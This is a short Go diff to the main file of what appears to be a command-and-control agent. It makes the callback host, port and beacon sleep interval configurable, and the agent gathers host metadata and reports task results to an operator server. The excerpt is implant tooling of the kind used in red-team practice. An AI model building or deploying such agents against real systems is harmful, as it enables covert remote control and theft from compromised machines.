@@ -6,10 +6,11 @@ import (
 	"os"
 	"os/user"
 	"runtime"
+	"strconv"
 	"time"
 
-	"github.com/gerbsec/D2/agent/commands"
-	"github.com/gerbsec/D2/agent/models"
+	"github.com/gerbsec/G2/agent/commands"
+	"github.com/gerbsec/G2/agent/models"
 
 	"github.com/google/uuid"
 )
@@ -21,11 +22,12 @@ var (
 )
 
 func main() {
-	LHOST := "localhost"
-	LPORT := 8001
+	LHOST := os.Args[1]
+	LPORT, _ := strconv.Atoi(os.Args[2])
+	SLEEP, _ := strconv.Atoi(os.Args[3])
 	generateMetadata()
 	loadAgentCommands()
-	commModule = models.NewHttpCommModule(LHOST, LPORT)
+	commModule = models.NewHttpCommModule(LHOST, LPORT, SLEEP)
 	commModule.Init(metadata)
 
 	done := commModule.Start()
@@ -77,7 +79,7 @@ func sendTaskResult(taskId string, result string) {
 	commModule.SendData(taskResult)
 }
 
-func InternalIP() (string, error) {
+func internalIP() (string, error) {
 	interfaces, err := net.Interfaces()
 	if err != nil {
 		return "", err
@@ -114,7 +116,7 @@ func generateMetadata() {
 		os.Exit(1)
 	}
 
-	ip, err := InternalIP()
+	ip, err := internalIP()
 	if err != nil {
 		ip = "127.0.0.1"
 	}
